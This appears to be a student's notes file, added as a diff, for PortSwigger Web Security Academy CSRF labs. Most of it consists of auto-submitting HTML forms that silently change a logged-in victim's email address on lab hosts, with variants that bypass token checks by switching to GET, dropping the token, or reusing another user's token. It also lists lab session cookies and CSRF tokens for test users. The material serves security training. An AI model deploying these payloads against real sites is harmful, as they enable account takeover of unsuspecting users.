@@ -1,0 +1,135 @@
+csrf labs tirgul
+<!-- Lab: CSRF vulnerability with no defenses -->
+https://portswigger.net/web-security/csrf/lab-no-defenses
+
+
+stage1:
+victim ---> url exploit server ---> html page:
+
+
+<html>
+    <body>
+        <form action="https://0a2900cb04709bdbc1c81e6b00480012.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="email@new.com" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+
+    </body>
+</html>
+
+
+stage2:
+form --> Post request to change email
+
+
+<!-- CSRF where token validation depends on request method -->
+https://0a0a00cb0495a881c0324450007a0052.web-security-academy.net/my-account
+
+
+<html>
+    <body>
+        <form method="GET" action="https://0a0a00cb0495a881c0324450007a0052.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="attacker@new.com">
+        </form>
+        <script>
+                document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+
+<!-- 3. Lab: CSRF where token validation depends on token being present -->
+
+<html>
+    <body>
+        <form action="https://0aea0065035295ddc07267fd00270089.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="atacker@new.com" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+token present == validation
+
+token not present == no validation
+
+
+<!-- Lab: CSRF where token is not tied to user session -->
+https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session
+
+unused token peter:
+5HMcJyAkRH8lzbu3fFkElAghHNVKh8bA
+0X8e0CjrNUfLYO5sR9VNdqTnSXdr182k
+
+
+<html>
+    <body>
+        <form action="https://0afa006303b1be38c0543b94000f00c9.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="email@new.com" />
+            <input type="hidden" name="csrf" value="DHry9CGuN4TCPCKLQuWPSdMLsTPQ5XUq" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+
+
+
+
+carlos:
+session=bGGKhTZCg1lXRuS4X2hnWFXcnwjnlWAl
+csrf=XmZjFxa7KMkNrqhs1OKPC7KDMSytIZWv
+
+peter:
+session=cDYcnsUVn23FFIAo2tjQg2I1Ha3NBqW3
+csrf=JTJluTK2nPSv6K0mHDIXwlDirwYmUr0D
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://0a0a00cb0495a881c0324450007a0052.web-security-academy.net/my-account/change-email
+
+(body:)
+email=test2%40drive.com&csrf=t82fI42WDbg4MEejOf28YXRjCZkzjZv9
+
+<html>
+    <body>
+        <form action="URL" method="POST">
+            <input type="hidden" name="email" value="email@new.com" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+
+++++++++++++++++++++++++++++++++++++++++
+
+https://0a0a00cb0495a881c0324450007a0052.web-security-academy.net/my-account/change-email?email=test2%40drive.com&csrf=t82fI42WDbg4MEejOf28YXRjCZkzjZv9
+
+<html>
+    <body>
+        <form method="GET" action="URL">
+            <input type="hidden" name="email" value="email@new.com">
+        </form>
+        <script>
+                document.forms[0].submit();
+        </script>
+    </body>
+</html>
